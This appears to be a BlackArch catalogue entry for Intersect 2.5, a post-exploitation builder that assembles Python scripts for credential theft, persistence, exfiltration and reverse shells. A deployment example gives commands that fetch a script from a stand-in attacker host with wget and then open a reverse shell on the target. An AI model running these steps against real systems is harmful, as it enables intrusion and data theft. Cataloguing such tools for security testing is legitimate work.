---
name: "intersect"
categories:
  - blackarch-automation
version: "2.5"
homepage: "https://github.com/ohdae/Intersect-2.5"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom
meta-checked: "2026-11-09"
github-repo: "ohdae/Intersect-2.5"
github-status: "gone"
github-match: "exact"
gh-checked: "2026-11-09"
worth: 4.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
---

# intersect

> Post-exploitation script generator: assemble bespoke Python recon/exfil payloads from Standard and Custom modules.

## What it's for

Intersect 2.5 (ohdae, 2012) is a post-exploitation framework that ships as a builder, not a finished tool: there is no final script until you make one. `Create.py` walks you through selecting modules — Standard modules (credential gathering, network discovery, extras, reverse shell) plus Custom modules covering remote shells and data exfiltration — then compiles them into a single standalone Python script with the options you set (bind port, remote host, proxy port, XOR key). Custom modules can be imported from a local path or URL, and the distribution includes ready-made sample scripts (Gather, Network, Persist, Shells) and reverse shells over TCP/UDP/ICMP/XOR/AES/XMPP. It is Python 2 software and the original repository is gone (mirrors exist, e.g. bonsaiviking/Intersect-2.5); BlackArch packages the builder as the `intersect` command.

## Typical use cases

### Build a custom post-exploitation script

```
python Create.py
```

Outcome: the creation utility opens its main menu; choose "Create Custom Script", type module names (e.g. `creds`, `network`, `bshell`) one per line, then run `:create` — you are prompted for a script name and options, and the finished standalone script is saved to `Scripts/<name>.py`. `:help` lists the menu commands at any point and `:quit` returns to the main menu.

### Run a pre-built sample

```
python Scripts/Samples/Gather.py -c -n
```

Outcome: executes the sample's credential (`-c`) and network (`-n`) modules on the host where it runs and collects their output — the bundled samples (Gather, Network, Persist, Shells) demonstrate what a finished build looks like; `--help` lists each sample's own flags.

### Deploy a generated script on a target

```
wget http://ATTACKER_IP/recon.py -O /tmp/r.py
python /tmp/r.py --rshell
```

Outcome: for a script built with a shell module, `--rshell` opens an interactive reverse shell back to your listener even from bare command-execution access; over that shell, `extask <module>` runs the script's remaining modules remotely and `helpme` lists shell commands.

### Import your own module into the framework

```
python Create.py
```

Outcome: main-menu option 3 ("Load Plugin Module") prompts for the module's location — a local path or a URL — copies it into the Custom modules directory, and from then on it can be included in builds like any bundled module.

*No corpus evidence — derived from upstream documentation.*
